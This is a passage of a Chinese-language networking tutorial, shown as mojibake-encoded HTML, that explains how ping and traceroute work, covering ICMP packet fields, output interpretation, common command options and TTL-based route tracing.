</span>é€šå¸¸åŒ…å«æ—¶é—´æˆ³<br><span class="hljs-bullet">- </span>ç”¨äºè®¡ç®—RTT<br><span class="hljs-bullet">- </span>é»˜è®¤56å­—èŠ‚ï¼ˆLinuxï¼‰æˆ–32å­—èŠ‚ï¼ˆWindowsï¼‰<br></code></pre></td></tr></table></figure><h3 id="2-3-pingå·¥ä½œæµç¨‹"><a href="#2-3-pingå·¥ä½œæµç¨‹" class="headerlink" title="2.3 pingå·¥ä½œæµç¨‹"></a>2.3 pingå·¥ä½œæµç¨‹</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å®Œæ•´æµç¨‹ï¼š<br><br><span class="hljs-bullet">1.</span> ç”¨æˆ·æ‰§è¡Œï¼šping www.google.com<br><br><span class="hljs-bullet">2.</span> DNSè§£æï¼š<br>   www.google.com â†’ 142.250.185.14<br><br><span class="hljs-bullet">3.</span> æ„é€ ICMPæŠ¥æ–‡ï¼š<br><span class="hljs-bullet">   -</span> Type = 8 (Echo Request)<br><span class="hljs-bullet">   -</span> Code = 0<br><span class="hljs-bullet">   -</span> ID = è¿›ç¨‹ID<br><span class="hljs-bullet">   -</span> Seq = 1, 2, 3... (é€’å¢)<br><span class="hljs-bullet">   -</span> Data = æ—¶é—´æˆ³ + å¡«å……æ•°æ®<br><br><span class="hljs-bullet">4.</span> å°è£…IPæ•°æ®åŒ…ï¼š<br><span class="hljs-bullet">   -</span> æºIPï¼šæœ¬æœºIP<br><span class="hljs-bullet">   -</span> ç›®æ ‡IPï¼š142.250.185.14<br><span class="hljs-bullet">   -</span> åè®®ï¼šICMP (1)<br><span class="hljs-bullet">   -</span> TTLï¼š64ï¼ˆé»˜è®¤ï¼‰<br><br><span class="hljs-bullet">5.</span> å‘é€æ•°æ®åŒ…<br><br><span class="hljs-bullet">6.</span> ç­‰å¾…å“åº”ï¼ˆè¶…æ—¶æ—¶é—´é€šå¸¸1-5ç§’ï¼‰<br><br><span class="hljs-bullet">7.</span> æ”¶åˆ°ICMPå›æ˜¾åº”ç­”ï¼š<br><span class="hljs-bullet">   -</span> Type = 0 (Echo Reply)<br><span class="hljs-bullet">   -</span> éªŒè¯IDå’ŒSeqåŒ¹é…<br><span class="hljs-bullet">   -</span> è®¡ç®—RTT = å½“å‰æ—¶é—´ - æ—¶é—´æˆ³<br><br><span class="hljs-bullet">8.</span> æ˜¾ç¤ºç»“æœï¼š<br>   64 bytes from 142.250.185.14: icmp<span class="hljs-emphasis">_seq=1 ttl=55 time=15.2 ms</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">9. é‡å¤æ­¥éª¤3-8ï¼ˆé»˜è®¤æ— é™æ¬¡ï¼Œå¯æŒ‡å®šæ¬¡æ•°ï¼‰</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">10. ç»Ÿè®¡ä¿¡æ¯ï¼š</span><br><span class="hljs-emphasis">    - å‘é€æ•°é‡</span><br><span class="hljs-emphasis">    - æ¥æ”¶æ•°é‡</span><br><span class="hljs-emphasis">    - ä¸¢åŒ…ç‡</span><br><span class="hljs-emphasis">    - RTTï¼ˆæœ€å°/å¹³å‡/æœ€å¤§/æ ‡å‡†å·®ï¼‰</span><br></code></pre></td></tr></table></figure><h3 id="2-4-pingè¾“å‡ºè§£æ"><a href="#2-4-pingè¾“å‡ºè§£æ" class="headerlink" title="2.4 pingè¾“å‡ºè§£æ"></a>2.4 pingè¾“å‡ºè§£æ</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ç¤ºä¾‹è¾“å‡ºï¼š<br><br>$<span class="hljs-built_in"> ping </span>-c 4 google.com<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>google.com (142.250.185.14) 56(84) bytes of data.<br>64 bytes <span class="hljs-keyword">from</span> lax30s04-in-f14.1e100.net (142.250.185.14): <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=55 <span class="hljs-attribute">time</span>=15.2 ms<br>64 bytes <span class="hljs-keyword">from</span> lax30s04-in-f14.1e100.net (142.250.185.14): <span class="hljs-attribute">icmp_seq</span>=2 <span class="hljs-attribute">ttl</span>=55 <span class="hljs-attribute">time</span>=14.8 ms<br>64 bytes <span class="hljs-keyword">from</span> lax30s04-in-f14.1e100.net (142.250.185.14): <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=55 <span class="hljs-attribute">time</span>=15.5 ms<br>64 bytes <span class="hljs-keyword">from</span> lax30s04-in-f14.1e100.net (142.250.185.14): <span class="hljs-attribute">icmp_seq</span>=4 <span class="hljs-attribute">ttl</span>=55 <span class="hljs-attribute">time</span>=15.1 ms<br><br>--- google.com<span class="hljs-built_in"> ping </span>statistics ---<br>4 packets transmitted, 4 received, 0% packet loss, time 3005ms<br>rtt min/avg/max/mdev = 14.827/15.150/15.532/0.261 ms<br><br>è¾“å‡ºè§£æï¼š<br><br>ç¬¬ä¸€è¡Œï¼š<span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>google.com (142.250.185.14) 56(84) bytes of data.<br>- ç›®æ ‡åŸŸåå’ŒIP<br>- 56å­—èŠ‚æ•°æ® + 28å­—èŠ‚å¤´éƒ¨ï¼ˆIP 20 + ICMP 8ï¼‰= 84å­—èŠ‚<br><br>å“åº”è¡Œï¼š<br>64 bytes <span class="hljs-keyword">from</span> lax30s04-in-f14.1e100.net (142.250.185.14): <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=55 <span class="hljs-attribute">time</span>=15.2 ms<br>- 64å­—èŠ‚ï¼šIPæ•°æ®åŒ…å¤§å°ï¼ˆå®é™…ICMPéƒ¨åˆ†ï¼‰<br>- <span class="hljs-keyword">from</span>ï¼šæ¥æºä¸»æœºå’ŒIP<br>- icmp_seqï¼šåºåˆ—å·ï¼ˆä»1å¼€å§‹ï¼‰<br>- ttlï¼šå‰©ä½™è·³æ•°ï¼ˆåˆå§‹64ï¼Œç»è¿‡9è·³ï¼Œå‰©55ï¼‰<br>- timeï¼šå¾€è¿”æ—¶é—´ï¼ˆRTTï¼‰<br><br>ç»Ÿè®¡ä¿¡æ¯ï¼š<br>- 4 packets transmittedï¼šå‘é€4ä¸ª<br>- 4 receivedï¼šæ”¶åˆ°4ä¸ª<br>- 0% packet lossï¼šä¸¢åŒ…ç‡0%<br>- time 3005msï¼šæ€»è€—æ—¶<br>- rtt min/avg/max/mdevï¼šRTTæœ€å°/å¹³å‡/æœ€å¤§/æ ‡å‡†å·®<br><br>å¸¸è§æƒ…å†µï¼š<br><br>1. æ­£å¸¸å“åº”ï¼š<br>   64 bytes <span class="hljs-keyword">from</span> <span class="hljs-built_in">..</span>.: <span class="hljs-attribute">time</span>=15.2 ms<br>   â†’ ç½‘ç»œæ­£å¸¸<br><br>2. è¯·æ±‚è¶…æ—¶ï¼š<br>   Request timeout <span class="hljs-keyword">for</span> icmp_seq 1<br>   â†’ åŒ…ä¸¢å¤±æˆ–è¢«è¿‡æ»¤<br><br>3. ç›®æ ‡ä¸å¯è¾¾ï¼š<br>   <span class="hljs-keyword">From</span> 192.168.1.1: <span class="hljs-attribute">icmp_seq</span>=1 Destination Host Unreachable<br>   â†’ è·¯ç”±ä¸å¯è¾¾æˆ–ä¸»æœºå…³é—­<br><br>4. TTLè¿‡æœŸï¼š<br>   <span class="hljs-keyword">From</span> 10.0.0.1: <span class="hljs-attribute">icmp_seq</span>=1 Time <span class="hljs-keyword">to</span> live exceeded<br>   â†’ TTLè€—å°½ï¼Œé€šå¸¸æ˜¯è·¯ç”±ç¯è·¯<br><br>5. ç½‘ç»œä¸å¯è¾¾ï¼š<br>  <span class="hljs-built_in"> Network </span>is unreachable<br>   â†’ æœ¬åœ°è·¯ç”±è¡¨æ— è·¯ç”±<br></code></pre></td></tr></table></figure><h3 id="2-5-pingå¸¸ç”¨é€‰é¡¹"><a href="#2-5-pingå¸¸ç”¨é€‰é¡¹" class="headerlink" title="2.5 pingå¸¸ç”¨é€‰é¡¹"></a>2.5 pingå¸¸ç”¨é€‰é¡¹</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs routeros">å¸¸ç”¨å‚æ•°ï¼š<br><br>-c count (Linux) æˆ– -n count (Windows)<br>å‘é€æŒ‡å®šæ•°é‡çš„åŒ…<span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>-c 10 google.com<br><br>-i interval<br>è®¾ç½®å‘é€é—´éš”ï¼ˆç§’ï¼‰<span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>-i 0.2 google.com  # æ¯0.2ç§’ä¸€æ¬¡<br><br>-s size<br>è®¾ç½®æ•°æ®åŒ…å¤§å°ï¼ˆå­—èŠ‚ï¼‰<span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>-s 1000 google.com<br><br>-t ttl (Linux) æˆ– -i ttl (Windows)<br>è®¾ç½®TTLå€¼<span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>-t 10 google.com<br><br>-W timeout<br>è®¾ç½®è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰<span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>-W 1 google.com<br><br>-f (flood ping, éœ€è¦root)<br>å¿«é€Ÿå‘é€ï¼Œä¸ç­‰å¾…å“åº”<br>sudo<span class="hljs-built_in"> ping </span>-f google.com<br><br>-q (quiet)<br>åªæ˜¾ç¤ºç»Ÿè®¡ä¿¡æ¯<span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>-q -c 100 google.com<br><br>å®ç”¨æŠ€å·§ï¼š<br><br>1. æŒç»­ç›‘æ§è¿æ¥è´¨é‡ï¼š<br>  <span class="hljs-built_in"> ping </span>-i 0.2 gateway<br>   æ¯0.2ç§’pingä¸€æ¬¡ç½‘å…³<br><br>2. æµ‹è¯•å¤§åŒ…ä¼ è¾“ï¼š<br>  <span class="hljs-built_in"> ping </span>-s 1472 target<br>   æµ‹è¯•MTUï¼ˆ1500 - 28 = 1472ï¼‰<br><br>3. å¿«é€Ÿæµ‹è¯•è¿é€šæ€§ï¼š<br>  <span class="hljs-built_in"> ping </span>-c 1 -W 1 target<br>   åªå‘ä¸€ä¸ªåŒ…ï¼Œ1ç§’è¶…æ—¶<br><br>4. é™åˆ¶TTLæµ‹è¯•è·¯ç”±ï¼š<br>  <span class="hljs-built_in"> ping </span>-t 5 target<br>   çœ‹5è·³å†…æ˜¯å¦å¯è¾¾<br></code></pre></td></tr></table></figure><hr><h2 id="3-tracerouteå·¥ä½œåŸç†"><a href="#3-tracerouteå·¥ä½œåŸç†" class="headerlink" title="3. tracerouteå·¥ä½œåŸç†"></a>3. tracerouteå·¥ä½œåŸç†</h2><h3 id="3-1-tracerouteæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#3-1-tracerouteæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="3.1 tracerouteæ˜¯ä»€ä¹ˆï¼Ÿ"></a>3.1 tracerouteæ˜¯ä»€ä¹ˆï¼Ÿ</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">traceroute = è·¯ç”±è¿½è¸ª<br><br>åŠŸèƒ½ï¼š<br><span class="hljs-bullet">- </span>å‘ç°æ•°æ®åŒ…ä¼ è¾“è·¯å¾„<br><span class="hljs-bullet">- </span>æ˜¾ç¤ºæ¯ä¸€è·³è·¯ç”±å™¨<br><span class="hljs-bullet">- </span>æµ‹é‡æ¯ä¸€è·³çš„å»¶è¿Ÿ<br><span class="hljs-bullet">- </span>è¯Šæ–­è·¯ç”±é—®é¢˜<br><br>ç”Ÿæ´»æ¯”å–»ï¼š<br>åƒæ˜¯å¿«é€’è¿½è¸ªï¼š<br><span class="hljs-bullet">- </span>åŒ—äº¬é›†æ•£ä¸­å¿ƒ â†’ å»¶è¿Ÿ10ms<br><span class="hljs-bullet">- </span>çŸ³å®¶åº„åˆ†æ‹¨ä¸­å¿ƒ â†’ å»¶è¿Ÿ25ms<br><span class="hljs-bullet">- </span>éƒ‘å·è½¬è¿ä¸­å¿ƒ â†’ å»¶è¿Ÿ40ms<br><span class="hljs-bullet">- </span>æ­¦æ±‰é…é€ç«™ â†’ å»¶è¿Ÿ55ms<br><span class="hljs-bullet">- </span>ç›®çš„åœ° â†’ å»¶è¿Ÿ70ms<br><br>ç”¨é€”ï¼š<br>âœ… ç½‘ç»œæ•…éšœå®šä½<br>âœ… è·¯ç”±è·¯å¾„åˆ†æ<br>âœ… æ€§èƒ½ç“¶é¢ˆè¯Šæ–­<br>âœ… ç½‘ç»œæ‹“æ‰‘å‘ç°<br></code></pre></td></tr></table></figure><h3 id="3-2-tracerouteå®ç°åŸç†"><a href="#3-2-tracerouteå®ç°åŸç†" class="headerlink" title="3.2 tracerouteå®ç°åŸç†"></a>3.2 tracerouteå®ç°åŸç†</h3><p><strong>æ ¸å¿ƒæŠ€å·§ï¼šåˆ©ç”¨TTL</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs routeros">åŸç†ï¼š<br>TTLï¼ˆTime <span class="hljs-keyword">To</span> Liveï¼‰é€’å‡æœºåˆ¶<br>- æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨ï¼ŒTTLå‡1<br>- TTLå‡åˆ°0æ—¶ï¼Œè·¯ç”±å™¨ä¸¢å¼ƒåŒ…<br>- è·¯ç”±å™¨å‘é€ICMPè¶…æ—¶æ¶ˆæ¯ï¼ˆType 11ï¼‰<br><br>tracerouteåˆ©ç”¨è¿™ä¸ªæœºåˆ¶ï¼š<br><br>ç¬¬1è½®ï¼š<span class="hljs-attribute">TTL</span>=1<br>â”Œâ”€â”€â”€â”€â”€â”€â”  <span class="hljs-attribute">TTL</span>=1   â”Œâ”€â”€â”€â”€â”€â”€â”  <span class="hljs-attribute">TTL</span>=0   â”Œâ”€â”€â”€â”€â”€â”€â”<br>â”‚ ä¸»æœº â”‚ â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚ R1   â”‚ â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚ R2   â”‚<br>â””â”€â”€â”€â”€â”€â”€â”˜          â””â”€â”€â”€â”€â”€â”€â”˜          â””â”€â”€â”€â”€â”€â”€â”˜<br>                     â”‚<br>                     â”‚ ICMP Time Exceeded<br>                     â–¼<br>                  è®°å½•R1åœ°å€å’Œæ—¶é—´<br><br>ç¬¬2è½®ï¼š<span class="hljs-attribute">TTL</span>=2<br>â”Œâ”€â”€â”€â”€â”€â”€â”  <span class="hljs-attribute">TTL</span>=2   â”Œâ”€â”€â”€â”€â”€â”€â”  <span class="hljs-attribute">TTL</span>=1   â”Œâ”€â”€â”€â”€â”€â”€â”  <span class="hljs-attribute">TTL</span>=0   â”Œâ”€â”€â”€â”€â”€â”€â”<br>â”‚ ä¸»æœº â”‚ â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚ R1   â”‚ â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚ R2   â”‚ â”€â”€â”€â”€â”€â”€â”€â”€&gt;â”‚ R3   â”‚<br>â””â”€â”€â”€â”€â”€â”€â”˜          â””â”€â”€â”€â”€â”€â”€â”˜          â””â”€â”€â”€â”€â”€â”€â”˜          â””â”€â”€â”€â”€â”€â”€â”˜<br>                                        â”‚<br>                                        â”‚ ICMP Time Exceeded<br>                                        â–¼<br>                                    è®°å½•R2åœ°å€å’Œæ—¶é—´<br><br>ç¬¬3è½®ï¼š<span class="hljs-attribute">TTL</span>=3<br><span class="hljs-built_in">..</span>.ä¾æ­¤ç±»æ¨ï¼Œç›´åˆ°åˆ°è¾¾ç›®æ ‡ä¸»æœº<br><br>ç›®æ ‡ä¸»æœºå“åº”ï¼š<br>- å¦‚æœæ˜¯UDPï¼šç«¯å£ä¸å¯è¾¾ï¼ˆType 3, Code 3ï¼‰<br>- å¦‚æœæ˜¯ICMPï¼šå›æ˜¾åº”ç­”ï¼ˆType 0ï¼‰<br></code></pre></td></tr></table></figure><p><strong>ä¸¤ç§å®ç°æ–¹å¼</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> ä¼ ç»Ÿæ–¹å¼ï¼ˆUDPï¼‰ï¼š<br><span class="hljs-bullet">   -</span> å‘é€UDPåŒ…åˆ°é«˜ç«¯å£ï¼ˆ33434+ï¼‰<br><span class="hljs-bullet">   -</span> TTLä»1å¼€å§‹é€’å¢<br><span class="hljs-bullet">   -</span> ä¸­é—´è·¯ç”±å™¨ï¼šè¿”å›ICMPè¶…æ—¶<br><span class="hljs-bullet">   -</span> ç›®æ ‡ä¸»æœºï¼šè¿”å›ICMPç«¯å£ä¸å¯è¾¾<br><span class="hljs-bullet">   -</span> Linux/Unixé»˜è®¤ä½¿ç”¨<br><br><span class="hljs-bullet">2.</span> ICMPæ–¹å¼ï¼š<br><span class="hljs-bullet">   -</span> å‘é€ICMPå›æ˜¾è¯·æ±‚ï¼ˆType 8ï¼‰<br><span class="hljs-bullet">   -</span> TTLä»1å¼€å§‹é€’å¢<br><span class="hljs-bullet">   -</span> ä¸­é—´è·¯ç”±å™¨ï¼šè¿”å›ICMPè¶…æ—¶<br><span class="hljs-bullet">   -</span> ç›®æ ‡ä¸»æœºï¼šè¿”å›ICMPå›æ˜¾åº”ç­”<br><span class="hljs-bullet">   -</span> Windowsé»˜è®¤ä½¿ç”¨ï¼ˆtracertï¼‰<br><br>å¯¹æ¯”ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚    ç‰¹æ€§     â”‚   UDPæ–¹å¼    â”‚   ICMPæ–¹å¼   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ å‘é€åŒ…ç±»å‹  â”‚    UDP       â”‚    ICMP      â”‚<br>â”‚ ç›®æ ‡å“åº”    â”‚  ç«¯å£ä¸å¯è¾¾  â”‚   å›æ˜¾åº”ç­”   â”‚<br>â”‚ é˜²ç«å¢™å‹å¥½  â”‚     è¾ƒå·®     â”‚     è¾ƒå¥½     â”‚<br>â”‚ é»˜è®¤å¹³å°    â”‚  Linux/Unix  â”‚   Windows    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="3-3-tracerouteå·¥ä½œæµç¨‹"><a href="#3-3-tracerouteå·¥ä½œæµç¨‹" class="headerlink" title="3.3 tracerouteå·¥ä½œæµç¨‹"></a>3.3 tracerouteå·¥ä½œæµç¨‹</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs markdown">è¯¦ç»†æµç¨‹ï¼ˆUDPæ–¹å¼ï¼‰ï¼š<br><br><span class="hljs-bullet">1.</span> ç”¨æˆ·æ‰§è¡Œï¼štraceroute google.com<br><br><span class="hljs-bullet">2.</span> DNSè§£æï¼šè·å–ç›®æ ‡IP<br><br><span class="hljs-bullet">3.</span> åˆå§‹åŒ–ï¼š<br><span class="hljs-bullet">   -</span> TTL = 1<br><span class="hljs-bullet">   -</span> ç›®æ ‡ç«¯å£ = 33434ï¼ˆé€šå¸¸ï¼‰<br><br><span class="hljs-bullet">4.</span> ç¬¬1è·³ï¼š<br>   a. å‘é€3ä¸ªUDPåŒ…ï¼ˆTTL=1ï¼‰åˆ°ç«¯å£33434ã€33435ã€33436<br>   b. ç¬¬ä¸€ä¸ªè·¯ç”±å™¨æ”¶åˆ°ï¼ŒTTLå‡1å˜æˆ0<br>   c. è·¯ç”±å™¨ä¸¢å¼ƒåŒ…ï¼Œè¿”å›ICMPè¶…æ—¶ï¼ˆType 11, Code 0ï¼‰<br>   d. è®°å½•è·¯ç”±å™¨IPå’Œ3ä¸ªå“åº”æ—¶é—´<br>   e. æ˜¾ç¤ºï¼š1  192.168.1.1  1.5ms  1.3ms  1.4ms<br><br><span class="hljs-bullet">5.</span> ç¬¬2è·³ï¼š<br>   a. TTL = 2<br>   b. å‘é€3ä¸ªUDPåŒ…<br>   c. ç»è¿‡ç¬¬ä¸€ä¸ªè·¯ç”±å™¨ï¼ˆTTL=2â†’1ï¼‰<br>   d. ç¬¬äºŒä¸ªè·¯ç”±å™¨æ”¶åˆ°ï¼ˆTTL=1â†’0ï¼‰<br>   e. è¿”å›ICMPè¶…æ—¶<br>   f. æ˜¾ç¤ºï¼š2  10.0.0.1  5.2ms  5.1ms  5.3ms<br><br><span class="hljs-bullet">6.</span> ç»§ç»­é€’å¢TTLï¼Œé‡å¤æ­¥éª¤5<br><br><span class="hljs-bullet">7.</span> åˆ°è¾¾ç›®æ ‡ï¼š<br><span class="hljs-bullet">   -</span> ç›®æ ‡ä¸»æœºæ”¶åˆ°UDPåŒ…<br><span class="hljs-bullet">   -</span> ç«¯å£33434é€šå¸¸æœªä½¿ç”¨<br><span class="hljs-bullet">   -</span> è¿”å›ICMPç«¯å£ä¸å¯è¾¾ï¼ˆType 3, Code 3ï¼‰<br><span class="hljs-bullet">   -</span> tracerouteè¯†åˆ«åˆ°è¾¾ç›®æ ‡<br><span class="hljs-bullet">   -</span> åœæ­¢<br><br><span class="hljs-bullet">8.</span> è¶…æ—¶å¤„ç†ï¼š<br><span class="hljs-bullet">   -</span> å¦‚æœ2ç§’å†…æœªæ”¶åˆ°å“åº”<br><span class="hljs-bullet">   -</span> æ˜¾ç¤º * è¡¨ç¤ºè¶…æ—¶<br><span class="hljs-bullet">   -</span> å¯èƒ½åŸå› ï¼š<br><span class="hljs-bullet">     *</span> è·¯ç”±å™¨é…ç½®ä¸å“åº”ICMP<br><span class="hljs-bullet">     *</span> é˜²ç«å¢™è¿‡æ»¤<br><span class="hljs-bullet">     *</span> åŒ…ä¸¢å¤±<br><br><span class="hljs-bullet">9.</span> æ˜¾ç¤ºç»Ÿè®¡ä¿¡æ¯<br><br>ç‰¹æ®Šæƒ…å†µï¼š<br><br><span class="hljs-bullet">1.</span> * * <span class="hljs-emphasis">*ï¼ˆä¸‰ä¸ªæ˜Ÿå·ï¼‰</span><br><span class="hljs-emphasis">   - è¯¥è·³æ— å“åº”</span><br><span class="hljs-emphasis">   - å¯èƒ½è¢«é˜²ç«å¢™è¿‡æ»¤</span><br><span class="hljs-emphasis">   - æˆ–è·¯ç”±å™¨é…ç½®ä¸å›å¤ICMP</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">2. !H / !N / !P</span><br><span class="hljs-emphasis">   - !H: ä¸»æœºä¸å¯è¾¾</span><br><span class="hljs-emphasis">   - !N: ç½‘ç»œä¸å¯è¾¾</span><br><span class="hljs-emphasis">   - !P: åè®®ä¸å¯è¾¾</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">3. ç›¸åŒIPé‡å¤å‡ºç°</span><br><span class="hljs-emphasis">   - 